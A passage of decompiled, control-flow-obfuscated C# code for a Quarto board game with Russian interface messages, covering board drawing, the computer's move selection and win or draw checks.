					continue;
				case 25u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num5, num6]) == Color.Blue;
					num = -1180452870;
					continue;
				case 24u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -71611962) ^ -1349206099;
					continue;
				case 23u:
				{
					int num14;
					if (num6 >= 4)
					{
						num = -552779612;
						num14 = -552779612;
					}
					else
					{
						num = -1629372528;
						num14 = -1629372528;
					}
					continue;
				}
				case 22u:
					num = (int)(num2 * 11991635) ^ -1291823277;
					continue;
				case 21u:
					num8 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -731348275) ^ -1181128920;
					continue;
				case 20u:
					num = ((int)num2 * -1381395680) ^ -1462573239;
					continue;
				case 19u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -858186006) ^ -27374385;
						continue;
					}
					num7 = 0;
					goto IL_0130;
				case 18u:
					num6 = 0;
					num = -1018250002;
					continue;
				case 17u:
					num = ((int)num2 * -626493886) ^ 0x3807C004;
					continue;
				case 16u:
					num = (int)(num2 * 1933828306) ^ -1258380714;
					continue;
				case 14u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num8 + 0.05f) * (float)size, ((float)num9 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 547090472) ^ 0x24096B8B);
					continue;
				case 13u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -1956304915) ^ 0x2B264DF7;
					continue;
				case 12u:
					flag = num5 < 4;
					num = -427426973;
					continue;
				case 11u:
					num9 = Form1.smethod_39(e) / size;
					num = ((int)num2 * -2139209104) ^ 0x5DF25550;
					continue;
				case 10u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = -1907010367;
						num13 = -1907010367;
					}
					else
					{
						num12 = -1561276530;
						num13 = -1561276530;
					}
					num = num12 ^ (int)(num2 * 1399257567);
					continue;
				}
				case 9u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 1109630001;
						num11 = 1109630001;
					}
					else
					{
						num10 = 1552336861;
						num11 = 1552336861;
					}
					num = num10 ^ ((int)num2 * -1782197405);
					continue;
				}
				case 8u:
					num5++;
					num = (int)((num2 * 1503563385) ^ 0x4A997963);
					continue;
				case 7u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -71760313) ^ -227784501;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1587700788) ^ 0x2E65AF49);
					continue;
				case 5u:
					num5 = 0;
					num = (int)(num2 * 1529307893) ^ -2047216717;
					continue;
				case 4u:
					Paint_Board();
					num = (int)(num2 * 1388282753) ^ -699222796;
					continue;
				case 3u:
					num6++;
					num = -171779700;
					continue;
				case 2u:
					num7 = ((board[num9, num8] == null) ? 1 : 0);
					goto IL_0130;
				case 1u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num8 * size + 4, num9 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1836394203) ^ 0x3B60E1D);
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1202140025;
						num4 = 1202140025;
					}
					else
					{
						num3 = 2044345306;
						num4 = 2044345306;
					}
					num = num3 ^ (int)(num2 * 2096064346);
					continue;
				}
				default:
					return;
				case 15u:
					break;
				case 28u:
					return;
					IL_0130:
					flag3 = (byte)num7 != 0;
					num = -597735918;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		bool flag4 = default(bool);
		int num3 = default(int);
		int num19 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num28 = default(int);
		int num29 = default(int);
		int num17 = default(int);
		bool flag8 = default(bool);
		bool flag2 = default(bool);
		int num9 = default(int);
		int num31 = default(int);
		int num30 = default(int);
		int num4 = default(int);
		bool flag10 = default(bool);
		bool flag11 = default(bool);
		int num20 = default(int);
		bool flag5 = default(bool);
		int num39 = default(int);
		int num42 = default(int);
		int num43 = default(int);
		int num44 = default(int);
		int num34 = default(int);
		int num33 = default(int);
		bool flag7 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag14 = default(bool);
		int num38 = default(int);
		int num47 = default(int);
		bool flag6 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		Figurine[,] array3 = default(Figurine[,]);
		Graphics graphics_ = default(Graphics);
		bool flag13 = default(bool);
		bool flag9 = default(bool);
		int num37 = default(int);
		bool flag = default(bool);
		bool flag12 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 1539048862;
			while (true)
			{
				uint num2;
				int num16;
				int num18;
				int num27;
				int num32;
				switch ((num2 = (uint)num ^ 0x3BAB2ABu) % 179u)
				{
				case 178u:
					num16 = ((!Standoff(board)) ? 1 : 0);
					goto IL_0015;
				case 177u:
				{
					int num25;
					int num26;
					if (flag4)
					{
						num25 = -1505131253;
						num26 = -1505131253;
					}
					else
					{
						num25 = -2085381325;
						num26 = -2085381325;
					}
					num = num25 ^ ((int)num2 * -853923213);
					continue;
				}
				case 176u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 1083027602) ^ -1774181331;
					continue;
				case 175u:
					num = (int)(num2 * 1076272255) ^ -942807276;
					continue;
				case 174u:
					num3 = num19;
					num = (int)(num2 * 1007596367) ^ -462070048;
					continue;
				case 173u:
					num = (int)((num2 * 980759553) ^ 0x4324FFD8);
					continue;
				case 172u:
				{
					int num14;
					int num15;
					if (board[num6, num5] != null)
					{
						num14 = 933423388;
						num15 = 933423388;
					}
					else
					{
						num14 = 1029991747;
						num15 = 1029991747;
					}
					num = num14 ^ ((int)num2 * -747438531);
					continue;
				}
				case 171u:
					num28++;
					num = ((int)num2 * -1755627304) ^ 0xBF3ED23;
					continue;
				case 170u:
					num29 = 0;
					num = 1095711970;
					continue;
				case 169u:
					num17 = Form1.smethod_33(rnd, 4);
					num = 263586835;
					continue;
				case 168u:
				{
					int num50;
					int num51;
					if (!flag8)
					{
						num50 = 1285692994;
						num51 = 1285692994;
					}
					else
					{
						num50 = 212281013;
						num51 = 212281013;
					}
					num = num50 ^ (int)(num2 * 1248745412);
					continue;
				}
				case 167u:
				{
					int num23;
					int num24;
					if (!flag2)
					{
						num23 = -1336443265;
						num24 = -1336443265;
					}
					else
					{
						num23 = -1735923702;
						num24 = -1735923702;
					}
					num = num23 ^ ((int)num2 * -1083527682);
					continue;
				}
				case 166u:
					num = ((int)num2 * -832652831) ^ 0x7EBA08A6;
					continue;
				case 165u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 1227806916) ^ -531138035;
					continue;
				case 164u:
				{
					int num70;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num9 * size + size / 2, (int)(((float)num31 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = 672382795;
						num70 = 672382795;
					}
					else
					{
						num = 1303025898;
						num70 = 1303025898;
					}
					continue;
				}
				case 163u:
					num = 1933160701;
					continue;
				case 162u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -2124973026) ^ 0x37B5CBCE;
					continue;
				case 161u:
					num19++;
					num = (int)(num2 * 1427839832) ^ -149367493;
					continue;
				case 160u:
					num = (int)(num2 * 1392129815) ^ -511308390;
					continue;
				case 159u:
					num = ((int)num2 * -1963566562) ^ -473458098;
					continue;
				case 158u:
					num = 193617805;
					continue;
				case 157u:
					num18 = ((num30 == num4) ? 1 : 0);
					goto IL_0287;
				case 156u:
				{
					int num62;
					int num63;
					if (flag10)
					{
						num62 = -716270980;
						num63 = -716270980;
					}
					else
					{
						num62 = -2048791871;
						num63 = -2048791871;
					}
					num = num62 ^ ((int)num2 * -2040154930);
					continue;
				}
				case 155u:
					num5 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1387021117) ^ 0x5ED74288;
					continue;
				case 154u:
					num = (int)((num2 * 542103186) ^ 0x2D88E514);
					continue;
				case 153u:
				{
					int num57;
					int num58;
					if (!flag11)
					{
						num57 = 755991911;
						num58 = 755991911;
					}
					else
					{
						num57 = 1221987326;
						num58 = 1221987326;
					}
					num = num57 ^ (int)(num2 * 976605835);
					continue;
				}
				case 152u:
					Form1.smethod_7((Control)(object)pictureBox[num19, num20], bool_0: false);
					num = 1497796831;
					continue;
				case 151u:
					num = (int)(num2 * 1110284125) ^ -1062220678;
					continue;
				case 150u:
				{
					int num52;
					int num53;
					if (!flag5)
					{
						num52 = -768107309;
						num53 = -768107309;
					}
					else
					{
						num52 = -173633369;
						num53 = -173633369;
					}
					num = num52 ^ ((int)num2 * -1055728008);
					continue;
				}
				case 149u:
					num39 = 0;
					num = ((int)num2 * -704598146) ^ -2002647692;
					continue;
				case 148u:
					num = ((int)num2 * -683481258) ^ 0x10BB8034;
					continue;
				case 147u:
					num4 = 0;
					num19 = 0;
					num = (int)((num2 * 2085064531) ^ 0x1198BAE);
					continue;
				case 146u:
					num = ((int)num2 * -1163746952) ^ 0x8C580C1;
					continue;
				case 145u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -596303932) ^ 0x94348C4;
					continue;
				case 144u:
					board[num42, num39] = new Figurine(storage[num43, num44]);
					storage[num43, num44] = null;
					num = (int)(num2 * 2064404803) ^ -440638214;
					continue;
				case 143u:
					num = (int)(num2 * 1738854566) ^ -794020901;
					continue;
				case 142u:
					flag8 = num34 < 4;
					num = 1212066834;
					continue;
				case 141u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1413291534) ^ 0x7E004CAA;
					continue;
				case 140u:
					Form1.smethod_7((Control)(object)pictureBox[num33, num34], bool_0: true);
					num = 595244229;
					continue;
				case 139u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = (int)(num2 * 308957537) ^ -999591096;
					continue;
				case 138u:
					num6 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1719567995) ^ -935046005;
					continue;
				case 137u:
				{
					int num21;
					int num22;
					if (!(Form1.smethod_41((Control)(object)borderBox[num19, num20]) == Color.Red))
					{
						num21 = -1198895850;
						num22 = -1198895850;
					}
					else
					{
						num21 = -651817331;
						num22 = -651817331;
					}
					num = num21 ^ (int)(num2 * 169282218);
					continue;
				}
				case 136u:
					num = (int)((num2 * 1984094518) ^ 0x3A9EA324);
					continue;
				case 135u:
				{
					int num10;
					int num11;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num10 = -2052717579;
						num11 = -2052717579;
					}
					else
					{
						num10 = -1705786042;
						num11 = -1705786042;
					}
					num = num10 ^ ((int)num2 * -1376396363);
					continue;
				}
				case 134u:
					flag2 = num9 < 4;
					num = 1907779922;
					continue;
				case 133u:
					num = ((int)num2 * -1542933243) ^ 0x432E995C;
					continue;
				case 132u:
					num = (int)(num2 * 1274709067) ^ -1671383547;
					continue;
				case 131u:
				{
					int num69;
					if (num19 >= 4)
					{
						num = 1891477701;
						num69 = 1891477701;
					}
					else
					{
						num = 1772488175;
						num69 = 1772488175;
					}
					continue;
				}
				case 130u:
					num33 = 0;
					num = ((int)num2 * -683803050) ^ 0x54910DAC;
					continue;
				case 129u:
					Form1.smethod_30((Control)(object)borderBox[num31, num9]);
					num = (int)(num2 * 892498758) ^ -782017150;
					continue;
				case 128u:
					flag11 = num29 < 4;
					num = 1994145340;
					continue;
				case 127u:
					flag7 = board[num28, num29] == null;
					num = 576607150;
					continue;
				case 126u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 1241070751) ^ -507995907;
					continue;
				case 125u:
					array[num28, num29] = new Figurine(storage[num3, num4]);
					if (!Stop(array))
					{
						num = ((int)num2 * -2089398451) ^ -428977426;
						continue;
					}
					num27 = 1;
					goto IL_06a4;
				case 124u:
					num20 = 0;
					num = 240060546;
					continue;
				case 123u:
					num42 = 0;
					num = (int)((num2 * 1107942823) ^ 0x2314EAB7);
					continue;
				case 122u:
				{
					int num67;
					int num68;
					if (!flag14)
					{
						num67 = -1969739110;
						num68 = -1969739110;
					}
					else
					{
						num67 = -592027861;
						num68 = -592027861;
					}
					num = num67 ^ (int)(num2 * 1386740784);
					continue;
				}
				case 121u:
					Form1.smethod_5((Control)(object)borderBox[num19, num20], Color.LimeGreen);
					num = ((int)num2 * -2070254087) ^ 0x3886AD6D;
					continue;
				case 120u:
					storage[num3, num4] = null;
					Form1.smethod_5((Control)(object)borderBox[num17, num30], Color.Blue);
					num = ((int)num2 * -1571179365) ^ -541504653;
					continue;
				case 119u:
					num = ((int)num2 * -721438046) ^ 0x31ACC995;
					continue;
				case 118u:
					num33++;
					num = (int)((num2 * 511978810) ^ 0x7D4D8F2E);
					continue;
				case 117u:
					num9++;
					num = (int)(num2 * 410023081) ^ -1283621294;
					continue;
				case 116u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1016629171) ^ 0x51D5B9D9;
					continue;
				case 115u:
				{
					int num66;
					if (num28 < 4)
					{
						num = 542749172;
						num66 = 542749172;
					}
					else
					{
						num = 946043868;
						num66 = 946043868;
					}
					continue;
				}
				case 114u:
					Form1.smethod_30((Control)(object)borderBox[num19, num20]);
					num = ((int)num2 * -1801982947) ^ 0x245176E9;
					continue;
				case 113u:
					num34++;
					num = (int)(num2 * 1581790187) ^ -1334778949;
					continue;
				case 112u:
					Form1.smethod_30((Control)(object)borderBox[num17, num30]);
					num = ((int)num2 * -917241208) ^ -687023413;
					continue;
				case 111u:
					num38 = 0;
					num = 1049151620;
					continue;
				case 110u:
					num = ((int)num2 * -2016372099) ^ -1839591813;
					continue;
				case 109u:
					num47++;
					num = (int)((num2 * 176596254) ^ 0x420E098B);
					continue;
				case 108u:
					flag6 = true;
					num = ((int)num2 * -1646278401) ^ 0x98DB9BD;
					continue;
				case 107u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array3);
					num = (int)(num2 * 1945615542) ^ -963410754;
					continue;
				case 106u:
					num = (int)(num2 * 324222042) ^ -1317938640;
					continue;
				case 105u:
					Form1.smethod_15(timer1);
					num = 17295590;
					continue;
				case 104u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = ((int)num2 * -458011464) ^ -912857966;
					continue;
				case 103u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -1422267535) ^ 0x33BF5AC;
					continue;
				case 102u:
					flag14 = Standoff(board);
					num = 161885938;
					continue;
				case 101u:
					num = 798246234;
					continue;
				case 100u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1717264652) ^ 0x345F5B61;
					continue;
				case 99u:
					num42 = num31;
					num = (int)((num2 * 1104654209) ^ 0x330821);
					continue;
				case 98u:
					num = ((int)num2 * -1814007022) ^ -1782667840;
					continue;
				case 97u:
				{
					int num64;
					int num65;
					if (!flag13)
					{
						num64 = -34115468;
						num65 = -34115468;
					}
					else
					{
						num64 = -673191749;
						num65 = -673191749;
					}
					num = num64 ^ ((int)num2 * -1338596813);
					continue;
				}
				case 96u:
					num9 = 0;
					num = 632974027;
					continue;
				case 95u:
				{
					int num61;
					if (num33 >= 4)
					{
						num = 1109835036;
						num61 = 1109835036;
					}
					else
					{
						num = 431757674;
						num61 = 431757674;
					}
					continue;
				}
				case 94u:
					num = ((int)num2 * -834793156) ^ -396636773;
					continue;
				case 93u:
					num44 = num9;
					Form1.smethod_5((Control)(object)borderBox[num31, num9], Color.White);
					num = ((int)num2 * -1421975944) ^ -169331793;
					continue;
				case 92u:
					board[num6, num5] = new Figurine(storage[num3, num4]);
					num = (int)((num2 * 871164263) ^ 0x6649ED7C);
					continue;
				case 91u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 869780232) ^ -1393549230;
					continue;
				case 90u:
					Form1.smethod_30((Control)(object)label2);
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -2017681607) ^ 0x3CA5DF30;
					continue;
				case 89u:
					num = ((int)num2 * -323073875) ^ 0x4B200E42;
					continue;
				case 88u:
					num = (int)(num2 * 1724310232) ^ -508528;
					continue;
				case 87u:
					num = ((int)num2 * -268206167) ^ 0x5A0FAEC3;
					continue;
				case 86u:
					num43 = 0;
					num44 = 0;
					num = ((int)num2 * -1198201268) ^ -967838974;
					continue;
				case 85u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -185143098) ^ -226728324;
					continue;
				case 84u:
					num = (int)(num2 * 1862521038) ^ -1088984930;
					continue;
				case 83u:
					num28 = 0;
					num = ((int)num2 * -294701082) ^ -210275852;
					continue;
				case 82u:
					flag9 = array3[num47, num38] == null;
					num = 638915118;
					continue;
				case 80u:
					num32 = ((num37 < 9) ? 1 : 0);
					goto IL_0ba8;
				case 79u:
					num = ((int)num2 * -583732040) ^ 0x79366BA2;
					continue;
				case 78u:
					flag = num47 < 4;
					num = 710998255;
					continue;
				case 77u:
					num34 = 0;
					num = 1517717211;
					continue;
				case 76u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1850728199) ^ 0x2BA24E20);
					continue;
				case 75u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num6, num5] = new Figurine(storage[num3, num4]);
					num47 = 0;
					num = ((int)num2 * -1950266092) ^ 0x5042B15F;
					continue;
				case 74u:
				{
					int num59;
					int num60;
					if (!flag12)
					{
						num59 = 1463059528;
						num60 = 1463059528;
					}
					else
					{
						num59 = 260011117;
						num60 = 260011117;
					}
					num = num59 ^ (int)(num2 * 687972647);
					continue;
				}
				case 73u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 2088789988) ^ -51411356;
					continue;
				case 72u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = ((int)num2 * -717598629) ^ -1819615176;
					continue;
				case 71u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -1673380450) ^ -1406012875;
					continue;
				case 70u:
					num = 1177915380;
					continue;
				case 69u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num29 * size + 4, num28 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -696201078) ^ -964116145;
					continue;
				case 68u:
				{
					int num56;
					if (num20 >= 4)
					{
						num = 1071627661;
						num56 = 1071627661;
					}
					else
					{
						num = 204597127;
						num56 = 204597127;
					}
					continue;
				}
				case 67u:
					num37++;
					flag6 = false;
					num = ((int)num2 * -2015312050) ^ -1814836955;
					continue;
				case 66u:
					num = ((int)num2 * -1001894214) ^ 0x7DBAD5FB;
					continue;
				case 65u:
					num43 = num31;
					num = ((int)num2 * -1191620625) ^ 0x38662A27;
					continue;
				case 64u:
					num30 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 895989130) ^ 0x7E114F3C);
					continue;
				case 63u:
					num31++;
					num = (int)(num2 * 1035225488) ^ -1038859224;
					continue;
				case 62u:
					step++;
					num = ((int)num2 * -1311213572) ^ -971512134;
					continue;
				case 61u:
					num29++;
					num = 619475320;
					continue;
				case 60u:
					num = (int)((num2 * 545503313) ^ 0x30902431);
					continue;
				case 59u:
					num = 647724370;
					continue;
				case 58u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1717248504) ^ -46424282;
					continue;
				case 57u:
					num = 1245845039;
					continue;
				case 56u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -860256231) ^ -1505311997;
					continue;
				case 55u:
					num = (int)(num2 * 442953102) ^ -1728309417;
					continue;
				case 54u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 742230042) ^ -884663039;
					continue;
				case 53u:
					num = 18078691;
					continue;
				case 52u:
					num = 2089503854;
					continue;
				case 51u:
					num = ((int)num2 * -325628057) ^ -1277547109;
					continue;
				case 50u:
					num = (int)(num2 * 1601206387) ^ -1728332778;
					continue;
				case 49u:
					num = ((int)num2 * -2122323272) ^ -868423399;
					continue;
				case 48u:
				{
					int num54;
					int num55;
					if (Form1.smethod_41((Control)(object)borderBox[num31, num9]) == Color.Blue)
					{
						num54 = -132982770;
						num55 = -132982770;
					}
					else
					{
						num54 = -1498712857;
						num55 = -1498712857;
					}
					num = num54 ^ (int)(num2 * 1033402059);
					continue;
				}
				case 47u:
					Form1.smethod_20(pictureBox[num31, num9], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num31, num9]);
					num = (int)(num2 * 944683158) ^ -1451659698;
					continue;
				case 46u:
				{
					array2[num47, num38] = new Figurine(storage[num17, num30]);
					int num48;
					int num49;
					if (!Stop(array2))
					{
						num48 = 217978145;
						num49 = 217978145;
					}
					else
					{
						num48 = 83566281;
						num49 = 83566281;
					}
					num = num48 ^ ((int)num2 * -1619375099);
					continue;
				}
				case 45u:
					num = ((int)num2 * -1827362385) ^ -1928241634;
					continue;
				case 44u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 1448844118) ^ 0x1976380C);
					continue;
				case 43u:
					Form1.smethod_47(200);
					num = (int)(num2 * 17543138) ^ -1428007569;
					continue;
				case 42u:
				{
					int num45;
					int num46;
					if (!flag9)
					{
						num45 = -20439279;
						num46 = -20439279;
					}
					else
					{
						num45 = -548738395;
						num46 = -548738395;
					}
					num = num45 ^ (int)(num2 * 995840415);
					continue;
				}
				case 41u:
					num = ((int)num2 * -815539723) ^ -1313888231;
					continue;
				case 40u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1384094259;
					continue;
				case 39u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -1847427104) ^ -1837433149;
					continue;
				case 37u:
					num = ((int)num2 * -527438414) ^ 0x1AD1F2BA;
					continue;
				case 36u:
					num = (int)(num2 * 611826712) ^ -1829736477;
					continue;
				case 35u:
					num = ((int)num2 * -1634916562) ^ 0x30065CBF;
					continue;
				case 34u:
				{
					storage[num3, num4] = null;
					int num40;
					int num41;
					if (!Standoff(board))
					{
						num40 = -437145994;
						num41 = -437145994;
					}
					else
					{
						num40 = -717669382;
						num41 = -717669382;
					}
					num = num40 ^ (int)(num2 * 1155810615);
					continue;
				}
				case 33u:
					num39 = num9;
					num = ((int)num2 * -178377927) ^ 0x2CECF636;
					continue;
				case 32u:
					num38++;
					num = 1049151620;
					continue;
				case 31u:
					flag3 = num38 < 4;
					num = 1144817872;
					continue;
				case 30u:
					Form1.smethod_30((Control)(object)pictureBox1);
					Form1.smethod_47(200);
					num = (int)((num2 * 740924194) ^ 0x6F03E037);
					continue;
				case 29u:
					num = ((int)num2 * -591995065) ^ 0x72000171;
					continue;
				case 28u:
					num37 = 0;
					num = ((int)num2 * -95365417) ^ 0x45EF3F5;
					continue;
				case 27u:
					num = (int)((num2 * 858405154) ^ 0x31D75033);
					continue;
				case 26u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num29 + 0.05f) * (float)size, ((float)num28 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -14029147) ^ -1824763352;
					continue;
				case 25u:
				{
					int num35;
					int num36;
					if (flag7)
					{
						num35 = 1408504731;
						num36 = 1408504731;
					}
					else
					{
						num35 = 1465504664;
						num36 = 1465504664;
					}
					num = num35 ^ ((int)num2 * -1150794116);
					continue;
				}
				case 24u:
					num20++;
					num = 240060546;
					continue;
				case 23u:
					num = ((int)num2 * -79499882) ^ -1146264865;
					continue;
				case 22u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -109113867) ^ 0x1630B787;
					continue;
				case 21u:
					num31 = 0;
					num = (int)((num2 * 2132428271) ^ 0x2890DACB);
					continue;
				case 20u:
					num = ((int)num2 * -2121637740) ^ 0x3DB38D5F;
					continue;
				case 19u:
					num = 1324210314;
					continue;
				case 18u:
					num = (int)((num2 * 1454211340) ^ 0x68CFE229);
					continue;
				case 17u:
					if (!flag6)
					{
						num = (int)(num2 * 918062223) ^ -820005370;
						continue;
					}
					num32 = 1;
					goto IL_0ba8;
				case 16u:
					flag5 = num31 < 4;
					num = 587574468;
					continue;
				case 15u:
					if (storage[num17, num30] != null)
					{
						num = (int)(num2 * 1032943806) ^ -1746687841;
						continue;
					}
					num18 = 1;
					goto IL_0287;
				case 14u:
					num3 = 0;
					num = (int)((num2 * 1339475856) ^ 0x27537780);
					continue;
				case 13u:
					num = (int)((num2 * 301890782) ^ 0x5B7DBF0B);
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)(num2 * 2106612218) ^ -1299930146;
					continue;
				case 11u:
					board[num28, num29] = new Figurine(storage[num3, num4]);
					num = ((int)num2 * -769086501) ^ 0x51C97BBA;
					continue;
				case 10u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 240601387) ^ 0x7A0FC4DF);
					continue;
				case 9u:
					num27 = (Standoff(array) ? 1 : 0);
					goto IL_06a4;
				case 8u:
					num4 = num20;
					num = (int)(num2 * 1168934970) ^ -405031624;
					continue;
				case 7u:
					Paint_Board();
					if (!Stop(board))
					{
						num = ((int)num2 * -1484320455) ^ 0x59D9A9D;
						continue;
					}
					num16 = 0;
					goto IL_0015;
				case 6u:
					if (num17 == num3)
					{
						num = ((int)num2 * -1063328759) ^ 0x5A292B1C;
						continue;
					}
					num18 = 0;
					goto IL_0287;
				case 5u:
				{
					int num12;
					int num13;
					if (!flag3)
					{
						num12 = -398801723;
						num13 = -398801723;
					}
					else
					{
						num12 = -441012186;
						num13 = -441012186;
					}
					num = num12 ^ (int)(num2 * 1277396859);
					continue;
				}
				case 4u:
					num = ((int)num2 * -1112284116) ^ 0x627DC777;
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = 1961999307;
						num8 = 1961999307;
					}
					else
					{
						num7 = 915463388;
						num8 = 915463388;
					}
					num = num7 ^ (int)(num2 * 761991801);
					continue;
				}
				case 2u:
					num = (int)((num2 * 683928412) ^ 0x2158477F);
					continue;
				case 1u:
					num = (int)(num2 * 1874182499) ^ -903204739;
					continue;
				case 0u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num5 * size + 4, num6 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 608828741) ^ 0x587ED023);
					continue;
				default:
					return;
				case 81u:
					break;
				case 38u:
					return;
					IL_0015:
					flag10 = (byte)num16 != 0;
					num = 1794525992;
					continue;
					IL_0ba8:
					flag13 = (byte)num32 != 0;
					num = 1898427118;
					continue;
					IL_0287:
					flag12 = (byte)num18 != 0;
					num = 1397165838;
					continue;
					IL_06a4:
					flag4 = (byte)num27 != 0;
					num = 433623741;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num8 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag4 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 611760841;
			while (true)
			{
				uint num2;
				int num34;
				int num3;
				switch ((num2 = (uint)num ^ 0x1E01EAC4u) % 76u)
				{
				case 75u:
					flag = true;
					num = (int)(num2 * 430386746) ^ -232257977;
					continue;
				case 74u:
				{
					int num63;
					int num64;
					if (mem[num8, 2] != null)
					{
						num63 = -3613794;
						num64 = -3613794;
					}
					else
					{
						num63 = -143439091;
						num64 = -143439091;
					}
					num = num63 ^ (int)(num2 * 1671274859);
					continue;
				}
				case 73u:
				{
					int num16;
					if (mem[0, num8].Point == mem[1, num8].Point)
					{
						num = 184283131;
						num16 = 184283131;
					}
					else
					{
						num = 420798963;
						num16 = 420798963;
					}
					continue;
				}
				case 72u:
				{
					int num65;
					if (mem[num8, 0].Square != mem[num8, 1].Square)
					{
						num = 1416000227;
						num65 = 1416000227;
					}
					else
					{
						num = 405631566;
						num65 = 405631566;
					}
					continue;
				}
				case 71u:
				{
					int num36;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 299155598;
						num36 = 299155598;
					}
					else
					{
						num = 565300852;
						num36 = 565300852;
					}
					continue;
				}
				case 70u:
				{
					int num12;
					int num13;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num12 = -345262961;
						num13 = -345262961;
					}
					else
					{
						num12 = -1607886219;
						num13 = -1607886219;
					}
					num = num12 ^ (int)(num2 * 780618809);
					continue;
				}
				case 69u:
					if (mem[2, num8].Dark != mem[3, num8].Dark)
					{
						num = ((int)num2 * -16044824) ^ 0x675B1745;
						continue;
					}
					goto IL_0163;
				case 68u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1890067011) ^ -2095185457;
						continue;
					}
					goto IL_019e;
				case 67u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
